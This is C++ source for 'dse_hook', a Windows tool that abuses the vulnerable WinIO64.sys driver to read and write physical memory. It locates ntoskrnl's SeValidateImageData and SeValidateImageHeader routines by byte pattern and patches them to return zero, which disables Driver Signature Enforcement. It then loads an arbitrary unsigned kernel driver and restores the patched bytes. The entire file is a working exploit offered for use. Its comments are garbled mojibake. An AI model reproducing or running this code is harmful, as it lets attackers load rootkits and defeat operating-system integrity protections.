#pragma warning(disable: 4996)
#include <Windows.h>
#include <iostream>
#include <map>

typedef unsigned long u32;
typedef unsigned long long u64;

#define IOCTL_MAP 0x80102040
#define IOCTL_UNMAP 0x80102044

#define PATTERN_SEARCH_RANGE 0xBFFFFF
#define DRIVER_NAME_LEN 16

char se_validate_image_data_original[6] = { 0x00,0x00,0x00,0x00,0x00,0x00 };
char se_validate_image_header_original[6] = { 0x00,0x00,0x00,0x00,0x00,0x00 };

//SeValidateImageData
unsigned char se_validate_image_data_pattern[17] = { 0x48, 0x83, 0xEC, 0x48, 0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xD1, 0x48, 0x85, 0xC0 };
//SeValidateImageHeader 
unsigned char se_validate_image_header_pattern[21] = { 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x57, 0x48, 0x81, 0xEC, 0xA0, 0x00, 0x00, 0x00, 0x33, 0xF6 };

char patch[6] = {
	0xB8, 0x00, 0x00, 0x00, 0x00,	// mov rax, 0
	0xC3				// ret
};

u64 driver_handle = -1;
char winio_path[FILENAME_MAX];

struct winio_packet
{
	u64 size;
	u64 phys_address;
	u64 phys_handle;
	u64 phys_linear;
	u64 phys_section;
};

u64 phys_map(winio_packet& packet)
{
	// ͨ�� DeviceIoControl ���������� IOCTL_MAP ���󣬴��� winio_packet �ṹ�塣
  // �ú����������ַӳ�䵽�����ַ�ռ䣬������ӳ�������Ե�ַ�������ַ����
	u32 bytes_returned;
	if (!DeviceIoControl((void*)driver_handle, IOCTL_MAP, &packet, sizeof(winio_packet), &packet, sizeof(winio_packet), &bytes_returned, NULL))
		return NULL;

	// �ɹ�ʱ����ӳ���������ַ�����Ե�ַ��
	return packet.phys_linear;
}

bool phys_unmap(winio_packet& packet)
{
	u32 bytes_returned;

	// ͨ�� DeviceIoControl ���������� IOCTL_UNMAP ���󣬽�������ַ��ӳ�䡣
	if (!DeviceIoControl((void*)driver_handle, IOCTL_UNMAP, &packet, sizeof(winio_packet), NULL, 0, &bytes_returned, NULL))
		return false;

	return true;
}

bool read_phys(u64 addr, u64 buf, u64 size)
{ // ��������ʼ�� winio_packet
	winio_packet packet;
	packet.phys_address = addr;
	packet.size = size;

	// �������ַӳ�䵽�����ַ
	u64 linear_address = phys_map(packet);
	if (linear_address == NULL)
		return false;

	// ���ӳ���������ַ��Ч������ false
	if (IsBadReadPtr((void*)linear_address, 1))
		return false;

	// ���ӳ����Ϣ
	printf("[*] mapped pa:0x%llx to va:0x%llx\n", addr, (u64)linear_address);
	// ��ӳ���������ַ��ȡ���ݵ�������
	memcpy((void*)buf, (void*)linear_address, size);

	// ��������ַӳ��
	phys_unmap(packet);
	return true;
}


bool write_phys(u64 addr, u64 buf, u64 size)
{
	// ����һ�����ṹ�����ڴ洢�����ַ�ʹ�С
	winio_packet packet;
	packet.phys_address = addr; // �����ַ
	packet.size = size;// д��Ĵ�С

	// �������ַӳ�䵽���ԣ����⣩��ַ
	u64 linear_address = phys_map(packet);
	if (linear_address == NULL)
		return false;

	// ���ӳ���������ַ�޷����ʣ����� false
	if (IsBadReadPtr((void*)linear_address, 1))
		return false;

	printf("[*] mapped pa:0x%llx to va:0x%llx\n", addr, (u64)linear_address);
	// ���������е����ݸ��Ƶ�ӳ���������ַ
	memcpy((void*)linear_address, (void*)buf, size);

	// ��������ַ��ӳ��
	phys_unmap(packet);
	return true;
}

u64 find_pattern(u64 start, u64 range, unsigned char* pattern, size_t pattern_length)
{
	// Ϊ�����ڴ���仺��������СΪ range
	u64 buf = (u64)malloc(range);
	// ��ȡָ����Χ�������ڴ�
	read_phys(start, (u64)buf, range);

	u64 result = 0;// Ĭ�Ϸ���ֵ����ʾδ�ҵ�
	for (int i = 0; i < range; i++)
	{
		bool vtn = true;// ����Ƿ�ƥ��
		for (int j = 0; j < pattern_length; j++)
		{
			// ���ģʽ�ֽڲ�Ϊ 0x00 ���뵱ǰ�������ֽڲ�ƥ��
			if (vtn && pattern[j] != 0x00 && *(unsigned char*)(buf + i + j) != pattern[j])
			{
				vtn = false;// ���Ϊ��ƥ��
			}
		}

		// ��������ֽ�ƥ��
		if (vtn)
		{
			result = start + i;// ��¼ƥ�����ʼ��ַ
			goto ret; // ��ת�����ز��֣������������
		}
	}

ret:
	// �ͷŻ�����
	free((void*)buf);
	return result;// ����ƥ��ĵ�ַ����δ�ҵ���Ϊ 0
}

bool file_exists(const std::string path) {
	// ��ȡ�ļ����ԣ�����һ�� DWORD ���͵�ֵ
	DWORD v0 = GetFileAttributesA(path.c_str());

	// ����ļ����Ի�ȡ�ɹ����Ҹ�·������Ŀ¼��0x00000010 ��Ŀ¼�ı�־��
	return v0 != -1 && !(v0 & 0x00000010);
}

void load_driver_lazy(const char* driver_name, const char* bin_path)
{
	// ��̬�����ڴ棬���ڴ洢���������������
	u64 cmdline_create_buf = (u64)malloc(strlen(driver_name) + strlen(bin_path) + 53);
	// ��̬�����ڴ棬���ڴ洢���������������
	u64 cmdline_start_buf = (u64)malloc(strlen(driver_name) + 14);
	// ���� "sc create" �������һ���ں������������
	sprintf((char*)cmdline_create_buf, "sc create %s binpath=\"%s\" type=kernel>NUL", driver_name, bin_path);
	// ���� "sc start" ��������ղŴ����ķ���
	sprintf((char*)cmdline_start_buf, "sc start %s>NUL", driver_name);
	system((char*)cmdline_create_buf);
	system((char*)cmdline_start_buf);
}

int main(int argc, char* argv[])
{
	printf("[*] dse_hook by emlinhax\n");

	// ������������ÿ�������ĳ���
	if (argc != 3 || (strlen(argv[1]) < 2 || strlen(argv[2]) < 2))
	{
		printf("[!] ʹ�÷���: dse_hook.exe your_driver_name c:\\your_driver.sys\n");
		Sleep(1000);
		return -1;
	}

	if (!file_exists(argv[2]))
	{
		printf("[!] �Ҳ���ָ�������������ļ�.");
		system("pause>NUL");
		return -2;
	}

LOAD_WINIO:
	printf("[*] ���Դ� WinIo �豸�����ľ��...\n");
	driver_handle = (u64)CreateFileA("\\\\.\\WinIo", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (driver_handle == -1)
	{
		// ��ȡ��ǰĿ¼·��
		GetCurrentDirectoryA(FILENAME_MAX, winio_path);
		strcat(winio_path, "\\WinIO64.sys");

		// ����Ҳ��� WinIo �����ļ�����ʾ���˳�
		if (!file_exists(winio_path))
		{
			printf("[!] �Ҳ��� WinIo �����ļ���\n[!] ��ȷ�� \"WinIO64.sys\" �ڵ�ǰĿ¼�¡�\n");
			system("pause>NUL");
			return -3;
		}

		// ��� WinIo ����δ��ȷж�أ����Զ��ֹͣ��ɾ��
		system("sc stop winio_dse_hook >NUL");
		system("sc delete winio_dse_hook >NUL");

		// ���� WinIo ����
		load_driver_lazy("winio_dse_hook", winio_path);
		goto LOAD_WINIO; // ���³��Դ� WinIo ����
	}

	printf("[*] driver_handle: %p\n", driver_handle);

	// ####

	// Ѱ�� ntoskrnl.exe �Ļ���ַ
	printf("[*] Ѱ�� ntoskrnl.exe...\n");
	u64 ntos_base_pa = 0;
	for (u64 i = 0x000000000; i < 0x200000000; i += 0x000100000)
	{
		char* buf = (char*)malloc(2);
		read_phys(i, (u64)buf, 2);
		//��� "MZ" �����ȷ���Ƿ�Ϊ PE �ļ�
		if (buf[0] == 'M' && buf[1] == 'Z')
		{
			ntos_base_pa = i;
			printf("[*] ntoskrnl.exe ��ַ: 0x%p\n", ntos_base_pa);
			break;
		}

		free(buf);
	}

	if (!ntos_base_pa)
	{
		printf("[!] �Ҳ��� ntoskrnl.exe ��ַ��\n");
		system("pause>NUL");
		return -5;
	}

	// �ҵ�Ŀ��������ַ�����в����޸�
	u64 se_validate_image_data_pa = find_pattern(ntos_base_pa, PATTERN_SEARCH_RANGE, (unsigned char*)&se_validate_image_data_pattern, sizeof(se_validate_image_data_pattern));
	u64 se_validate_image_header_pa = find_pattern(ntos_base_pa, PATTERN_SEARCH_RANGE, (unsigned char*)&se_validate_image_header_pattern, sizeof(se_validate_image_header_pattern));
	if (se_validate_image_data_pa == 0 || se_validate_image_header_pa == 0)
	{
		printf("[!] �Ҳ���ģʽƥ��ĵ�ַ��\n");
		system("pause>NUL");
		return -6;
	}

	// ����ԭʼ���ֽ�
	read_phys(se_validate_image_data_pa, (u64)&se_validate_image_data_original, sizeof(se_validate_image_data_original));
	read_phys(se_validate_image_header_pa, (u64)&se_validate_image_header_original, sizeof(se_validate_image_header_original));

	// �滻�ֽڣ����в���
	write_phys(se_validate_image_data_pa, (u64)&patch, sizeof(patch));
	write_phys(se_validate_image_header_pa, (u64)&patch, sizeof(patch));
	printf("[*] ������Ӧ�ã��ƹ���֤���̡�\n");

	// ����Ŀ����������
	load_driver_lazy(argv[1], argv[2]);
	printf("[*] �����Ѽ��أ�\n");

	// �ָ�ԭʼ�ֽڣ�ȡ������
	write_phys(se_validate_image_data_pa, (u64)&se_validate_image_data_original, sizeof(se_validate_image_data_original));
	write_phys(se_validate_image_header_pa, (u64)&se_validate_image_header_original, sizeof(se_validate_image_header_original));
	printf("[*] �ָ�����֤���̡�\n");

	// ж�� WinIo ����
	system("sc stop winio_dse_hook >NUL");
	system("sc delete winio_dse_hook >NUL");
	printf("[*] ж���� WinIo ������\n");

	printf("[*] ��ɣ�\n");
	//system("pause");
	Sleep(1000);

	return 0;
}